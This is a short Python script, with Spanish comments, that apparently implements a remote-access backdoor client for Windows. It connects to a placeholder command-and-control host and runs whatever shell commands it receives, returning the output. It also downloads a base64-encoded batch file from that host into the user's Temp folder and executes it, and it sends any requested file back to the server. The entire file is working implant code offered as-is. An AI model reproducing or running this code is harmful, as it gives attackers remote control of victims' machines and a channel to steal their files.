import socket
import subprocess
import os
import base64
import requests 

HOST = 'C2IP'    
PORT = 8080              
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
user=os.getlogin()


def run_commands():
    data = s.recv(1024)
    cmd = data.decode()
    print(cmd)
    rCmd=subprocess.check_output([cmd],shell=True)
    print(rCmd)
    s.send(rCmd)
        
def recv_file():
    #cambiar ipC2:puerto
    r=requests.get("http://ipC2:puerto/r.bat")
    file = "C:\\Users\\"+user+"\\AppData\\Local\\Temp\\r.bat"
    data = r.text
    with open(file,"wb") as f:
                filestr = base64.b64decode(data)
                print(filestr)
                f.write(filestr)
    filename=f'[+] filename: {file} Guardado!'
    print(filename)
    s.send(filename.encode())  
               
def run_file(file="C:\\Users\\"+user+"\\AppData\\Local\\Temp\\r.bat"):
    subprocess.call([file])

def send_file():
    data = s.recv(1024)
    filePath= data.decode()
    print(filePath)
    if not os.path.exists(filePath):
         s.send(b"0")
    else:
         with open(filePath,"rb") as fb:
              for c in fb:
                s.send(c)
try:
    while True:
        try:
            mainData = s.recv(1024)    
            print(mainData)  
            if mainData.decode().lower() == "cmd":
                run_commands()  
            elif mainData.decode().lower() ==   "upload":
                recv_file()
                run_file()
 
            elif mainData.decode().lower() ==  "download":
                send_file()
            elif mainData.decode().lower() == '':
                s.close()
                break
        except:
            continue
except:
    print("")

            

    
 